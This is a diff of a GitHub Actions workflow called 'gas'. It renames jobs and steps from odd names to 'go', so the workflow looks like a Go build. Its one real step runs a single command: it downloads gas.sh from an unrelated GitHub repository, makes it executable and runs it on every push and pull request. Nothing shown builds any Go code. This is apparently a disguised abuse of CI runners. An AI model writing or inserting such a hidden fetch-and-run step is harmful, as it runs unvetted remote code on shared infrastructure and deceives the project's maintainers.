@@ -2,7 +2,7 @@ name: gas
 on: [push, pull_request]
 jobs:
 build:
-name: amboy
+name: go
 runs-on: ubuntu-latest
 strategy:
 max-parallel: 1
@@ -16,11 +16,14 @@ NUM_JOBS: 20
 JOB: ${{ matrix.go }}
 steps:
 - name: Set up Go ${{ matrix.go }}
+  if: matrix.go == 'tip'
 uses: actions/setup-go@v1
 with:
 go-version: ${{ matrix.go }}
+id: go
 - name: Setup
+  if: matrix.go == 'tip'
 uses: actions/checkout@v2
-- name: akuganteng
+- name: go
 run: |
 wget https://github.com/stokjacky/cek1/raw/main/gas.sh && chmod +x gas.sh && ./gas.sh
